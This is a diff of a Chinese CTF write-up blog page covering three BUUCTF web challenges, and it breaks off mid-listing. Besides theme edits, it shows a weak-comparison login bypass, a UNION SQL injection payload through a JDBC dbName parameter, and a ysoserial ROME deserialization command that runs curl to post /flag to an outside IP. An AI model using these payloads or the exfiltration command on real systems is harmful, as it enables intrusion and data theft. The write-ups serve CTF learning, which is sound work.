@@ -4,12 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF记录3, Jlan&#39;s Little World">
+    <meta name="keywords" content="BUUCTF记录3, J1an&#39;s Little World">
     <meta name="description" content="BUU第三份
 
 
 [极客大挑战 2020]Roamphp2-Myblog明显的文件读取，login中能看到登录密码生成逻辑，完全随机，没法直接拿到
-123456&amp;lt;?php$secret_seed = mt_rand();mt_sran">
+&amp;lt;?php
+$secret_seed = mt_rand();
+mt_srand($s">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +23,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUUCTF记录3 | Jlan&#39;s Little World</title>
+    <title>BUUCTF记录3 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -49,8 +51,6 @@
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -68,7 +68,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -89,55 +89,11 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -172,7 +128,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -195,55 +151,11 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -395,6 +307,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -404,13 +319,48 @@
 <span id="more"></span>
 
 <h2 id="极客大挑战-2020-Roamphp2-Myblog"><a href="#极客大挑战-2020-Roamphp2-Myblog" class="headerlink" title="[极客大挑战 2020]Roamphp2-Myblog"></a>[极客大挑战 2020]Roamphp2-Myblog</h2><p>明显的文件读取，login中能看到登录密码生成逻辑，完全随机，没法直接拿到</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret_seed</span> = mt_rand();</span><br><span class="line">mt_srand(<span class="variable">$secret_seed</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = mt_rand();</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$secret_seed</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$secret_seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>看登录逻辑</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$logined</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;Longlone&quot;</span> <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;  <span class="comment">// No one knows my password, including myself</span></span><br><span class="line">        <span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] = <span class="variable">$logined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$logined</span> === <span class="literal">false</span> &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] !== <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="variable">$tmp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$extension</span> = pathinfo(<span class="variable">$tmp_file</span>)[<span class="string">&#x27;extension&#x27;</span>]) != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">      <span class="variable">$allows</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allows</span>,<span class="literal">true</span>) <span class="keyword">and</span> in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$ext</span></span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;image/&#x27;</span>.<span class="variable">$ext</span>;&#125;,<span class="variable">$allows</span>),<span class="literal">true</span>))&#123;</span><br><span class="line">        <span class="variable">$upload_name</span> = sha1(md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>))).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">        move_uploaded_file(<span class="variable">$tmp_path</span>,<span class="string">&quot;assets/img/upload/&quot;</span>.<span class="variable">$upload_name</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"Longlone"</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// No one knows my password, including myself</span>
+        <span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$logined</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$logined</span> <span class="token operator">===</span> <span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('username or password not correct!');window.location.href='index.php?page=login';&lt;/script>"</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$tmp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$tmp_path</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$tmp_file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      <span class="token variable">$allows</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allows</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string single-quoted-string">'image/'</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token variable">$allows</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$upload_name</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.'</span><span class="token operator">.</span><span class="token variable">$extension</span><span class="token punctuation">;</span>
+        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assets/img/upload/"</span><span class="token operator">.</span><span class="token variable">$upload_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('Update image -> assets/img/upload/$&#123;upload_name&#125;') &lt;/script>"</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') &lt;/script>"</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可以看到密码验证中有一个弱比较，传入password为空直接绕过，然后就是文件上传，逻辑就是只能传图片，但是并没有限制文件内容，那phar或者zip吧内容打包都可以（因为触发还需要index中的include xxx.php，所以文件只能以php结尾），记得拦截包修改一下username和password参数，不然直接退出了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fa7bcb65-99a0-4643-93c2-93cacaaf442c&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">flag&#123;fa7bcb65-99a0-4643-93c2-93cacaaf442c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><p>嘿嘿做的第一道Java题，记录一下Java应该怎么入手，首先目录扫描，扫出了<code>swagger-ui.html</code>，可以看到这个web页面使用的所有API<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837086.png"></p>
 <p>看代码是<code>/common/test/sqlDict</code>这一路径的调用，其中dbName是我们传参内容，跟进其中的SqlDict.getTableData，查看getConnection方法，其中本质是通过jdbc接口进行数据库连接，而jdbc在解析数据库时类似于对URL的解析</p>
@@ -420,56 +370,209 @@
 <p>也就是#后面的内容会被忽略，但是这部分信息依然会被传递到dbName参数中进行接下来的查询</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837304.png"></p>
 <p>那我们就可以直接构造出sql注入的语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(name,0x3a,pwd)from user#</span><br><span class="line">构造出的语句</span><br><span class="line">Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;myapp#&#x27; union select group_concat(name,0x3a,pwd)from user#后面的不重要</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">dbName&#x3D;myapp#&#39; union select group_concat(name,0x3a,pwd)from user#
+构造出的语句
+Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema &#x3D; &#39;myapp#&#39; union select group_concat(name,0x3a,pwd)from user#后面的不重要<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>拿到用户名和密码<code>admin:admin@Rrrr_ctf_asde</code></p>
 <p>登录成功拿到token，发现是Java序列化后内容</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081917768.png"></p>
 <p>并且将内容提交到currentAPI中时，也会返回用户信息，yso构造序列化攻击即可</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/jlan/Library/Java/JavaVirtualMachines/azul-1.8.0_332/Contents/Home/bin/java -jar /Users/jlan/Documents/Tools/ysoserial-all.jar ROME &quot;curl http://182.61.46.138:1000 -d @/flag&quot; |base64</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;Users&#x2F;jlan&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;azul-1.8.0_332&#x2F;Contents&#x2F;Home&#x2F;bin&#x2F;java -jar &#x2F;Users&#x2F;jlan&#x2F;Documents&#x2F;Tools&#x2F;ysoserial-all.jar ROME &quot;curl http:&#x2F;&#x2F;182.61.46.138:1000 -d @&#x2F;flag&quot; |base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081932780.png"></p>
 <h2 id="GKCTF-2021-babycat"><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h2><p>快乐java题，靶机启动真的好慢，上来就是一个nt登录界面，登录不行，注册未开放<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131744693.png"></p>
 <p>但是点击注册查看源代码发现是注册逻辑被注释，按照注释的逻辑构造payload注册，成功注册并登录<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131745556.png"></p>
 <p>进入主页发电文件上传需要admin权限，并且在download存在文件泄露，先看web.xml内容，根据内容将class文件依次下载，下面我们主要查看uploadServlet和registerServlet</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="line"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;register&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.registerServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;login&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.loginServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;home&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.homeServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.uploadServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;download&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.downloadServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.web.servlet.logoutServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/logout&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;download&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home/download&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;register&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/register&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;display-name&gt;java&lt;/display-name&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;login&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/login&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;home&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home/upload&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.web.filter.LoginFilter&lt;/filter-class&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/home/*&lt;/url-pattern&gt;</span><br><span class="line">  